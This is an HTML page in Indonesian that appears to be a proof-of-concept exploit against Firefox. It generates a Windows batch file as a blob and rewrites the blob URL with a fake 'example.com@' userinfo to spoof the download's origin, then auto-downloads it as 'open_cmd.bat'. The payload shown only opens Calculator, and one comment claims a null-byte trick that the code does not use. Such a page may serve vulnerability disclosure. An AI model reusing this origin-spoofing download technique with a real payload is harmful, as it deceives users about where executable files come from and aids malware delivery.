<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Unique Function Bypass</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #0d1117; color: #c9d1d9; }
        button { width: 100%; padding: 15px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
        .btn-unique { background: #238636; } /* Hijau GitHub */
        .btn-unique:hover { background: #2ea043; }
        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #30363d; }
    </style>
</head>
<body>

    <h2>🔥 Unique Function Bypass 🔥</h2>
    <p style="font-size: 13px; color: #8b949e;">Bypass Origin tanpa API & tanpa Domain Asli</p>

    <button class="btn-unique" onclick="triggerUniqueBypass()">🚀 Eksekusi Function Unik</button>

    <pre id="log">Menunggu perintah...</pre>

    <script>
        function log(msg) {
            const el = document.getElementById('log');
            el.textContent += '\n> ' + msg;
            el.scrollTop = el.scrollHeight;
        }

        // KONTEN FILE
        const BAT_LINES = [
            '@echo off', 'title Calculator Launcher', 'echo ================================',
            'echo [1] Launching System32\\calc.exe...', 'start "" "C:\\Windows\\System32\\calc.exe"',
            'timeout /t 2 >nul', 'echo.', 'echo [4] Launching UWP AUMID...',
            'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
            'timeout /t 2 >nul', 'echo ================================', 'pause'
        ];
        const BAT_TEXT = BAT_LINES.join('\r\n') + '\r\n';

        function triggerUniqueBypass() {
            log('Mengeksekusi Function Unik...');
            
            // 1. Buat Blob URL (Asli dari domain abhirdd.github.io)
            const blob = new Blob([BAT_TEXT], { type: 'application/octet-stream' });
            const realUrl = URL.createObjectURL(blob);
            
            // 2. Trik Mindblowing: Manipulasi String URL dengan Null Byte & Userinfo
            // Firefox akan memparsing string ini dan kebingungan menentukan origin asli.
            // Kita menyisipkan "example.com" sebagai Userinfo palsu.
            const spoofedUrl = realUrl.replace('blob:https://', 'blob:https://example.com@');
            
            log('URL Asli: ' + realUrl.substring(0, 30) + '...');
            log('URL Palsu: ' + spoofedUrl.substring(0, 40) + '...');

            try {
                // 3. Ciptakan elemen anchor dengan URL yang sudah dimanipulasi
                const a = document.createElement('a');
                a.href = spoofedUrl;
                a.download = 'open_cmd.bat';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                log('✅ SUKSES! Cek panel download Firefox.');
                log('👉 Firefox akan dipaksa membaca Userinfo "example.com" sebagai Host!');
            } catch (e) {
                log('❌ Firefox memblokir manipulasi URL: ' + e.message);
            }
        }
    </script>
</body>
</html>
